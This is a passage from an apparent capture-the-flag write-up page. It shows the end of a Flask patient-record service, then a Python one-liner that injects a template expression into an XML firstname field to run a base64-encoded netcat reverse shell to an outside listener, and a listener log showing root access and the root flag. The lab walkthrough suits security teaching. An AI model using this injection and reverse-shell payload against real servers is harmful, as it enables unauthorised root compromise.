+        return &#34;XML ERROR\n&#34;, 400
+    patient = xml_root if xml_root.tag==&#34;patient&#34; else xml_root.find(&#34;patient&#34;)
+    if patient is None:
+        return &#34;No &lt;patient&gt; tag found\n&#34;, 400
+    id = uuid.uuid4().hex
+    data = {tag: (patient.findtext(tag) or &#34;&#34;) for tag in [&#34;firstname&#34;,&#34;lastname&#34;,&#34;sender_app&#34;,&#34;timestamp&#34;,&#34;birth_date&#34;,&#34;gender&#34;]}
+    notification = template(data[&#34;firstname&#34;],data[&#34;lastname&#34;],data[&#34;sender_app&#34;],data[&#34;timestamp&#34;],data[&#34;birth_date&#34;],data[&#34;gender&#34;])
+    path = os.path.join(USER_DIR,f&#34;{id}.txt&#34;)
+    with open(path,&#34;w&#34;) as f:
+        f.write(notification+&#34;\n&#34;)
+    return notification
+
+if __name__==&#34;__main__&#34;:
+    app.run(&#34;127.0.0.1&#34;,54321, threaded=True)
+</code></pre><pre tabindex="0"><code>sedric@interpreter:~$ python3 -c &#34;
+import urllib.request, base64
+cmd = &#39;nc 10.10.15.188 5555 -e /bin/bash&#39;
+b64_cmd = base64.b64encode(cmd.encode()).decode()
+xml = f&#39;&lt;patient&gt;&lt;timestamp&gt;20250101120000&lt;/timestamp&gt;&lt;sender_app&gt;TEST&lt;/sender_app&gt;&lt;id&gt;12345&lt;/id&gt;&lt;firstname&gt;{{__import__(\&#34;os\&#34;).system(__import__(\&#34;base64\&#34;).b64decode(\&#34;{b64_cmd}\&#34;).decode())}}&lt;/firstname&gt;&lt;lastname&gt;Doe&lt;/lastname&gt;&lt;birth_date&gt;01/01/1990&lt;/birth_date&gt;&lt;gender&gt;M&lt;/gender&gt;&lt;/patient&gt;&#39;
+req = urllib.request.Request(&#39;http://127.0.0.1:54321/addPatient&#39;,
+                             data=xml.encode(),
+                             headers={&#39;Content-Type&#39;: &#39;application/xml&#39;})
+urllib.request.urlopen(req)
+&#34;
+</code></pre><pre tabindex="0"><code>$ nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [10.10.15.188] from (UNKNOWN) [10.129.3.19] 58248
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root
+ls
+root.txt
+cat root.txt
+f014baa9e84ded9863150f607ce8b099
+</code></pre><p>![[Pasted image 20260223111727.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
